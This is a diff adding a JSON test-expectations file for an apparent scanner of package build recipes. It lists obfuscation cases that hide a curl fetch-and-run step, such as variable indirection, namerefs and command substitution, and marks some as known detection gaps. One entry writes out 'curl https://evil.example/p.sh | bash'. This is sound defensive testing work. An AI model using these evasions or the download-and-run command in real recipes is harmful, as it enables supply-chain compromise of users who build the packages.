@@ -1,0 +1,69 @@
+{
+  "evasion-fetch-via-indirect.diff": {
+    "description": "The fetch tool is reached through ${!C} indirection, so the resolved line keeps no literal curl/wget for R001/R002/R061 and R129 to name",
+    "must_fire": [
+      "R132"
+    ],
+    "min_score": 40
+  },
+  "evasion-shell-via-indirect.diff": {
+    "description": "curl is variable-routed and the shell is reached through ${!P}: R001's shell alternation names literals only",
+    "must_fire": [
+      "R132"
+    ],
+    "min_score": 40
+  },
+  "evasion-command-via-plus-eq.diff": {
+    "description": "C is assembled only with +=, so no single line carries a literal curl; once the resolver accumulates +=, $C resolves to `curl https://evil.example/p.sh | bash` and R001 owns it",
+    "must_fire": [
+      "R001"
+    ],
+    "min_score": 40
+  },
+  "evasion-depends-via-plus-eq.diff": {
+    "known_gap": true,
+    "description": "depends+= is not parsed as a dependency declaration, so nothing reports it (cold DB) and D003 sees no network makedepends",
+    "must_fire": [
+      "D001"
+    ],
+    "min_score": 25
+  },
+  "evasion-heredoc-fed-indirect.diff": {
+    "description": "The remote-execution line lives inside a heredoc fed straight to a shell; the literal pipe-to-shell rules never see it once the fetch is indirect",
+    "must_fire": [
+      "R132"
+    ],
+    "min_score": 40
+  },
+  "evasion-heredoc-written-indirect.diff": {
+    "description": "The recipe writes an executable script into $srcdir and sources it; R121/R124 want the writer and the executor in the same visible line, and the fetch inside is indirect",
+    "must_fire": [
+      "R132"
+    ],
+    "min_score": 40
+  },
+  "evasion-command-via-array-index.diff": {
+    "known_gap": true,
+    "description": "curl is stored as an array element and reached through ${A[0]}; the resolver folds A only as a whole, never by subscript, and ${A[0]} is not the ${!name} form R132 reads, so the fetch line keeps no literal curl",
+    "must_fire": [
+      "R133"
+    ],
+    "min_score": 40
+  },
+  "evasion-command-via-nameref.diff": {
+    "known_gap": true,
+    "description": "declare -n makes R a nameref for curl; the assignment resolver does not parse `declare -n name=target`, so $R never resolves and the fetch line keeps no literal curl",
+    "must_fire": [
+      "R134"
+    ],
+    "min_score": 40
+  },
+  "evasion-command-via-command-subst.diff": {
+    "known_gap": true,
+    "description": "curl is spelled by a printf inside $( ), which the resolver refuses to fold (no static value), so $C stays unresolved and no literal curl - split across 'cur' and 'l' - survives on any line",
+    "must_fire": [
+      "R135"
+    ],
+    "min_score": 40
+  }
+}
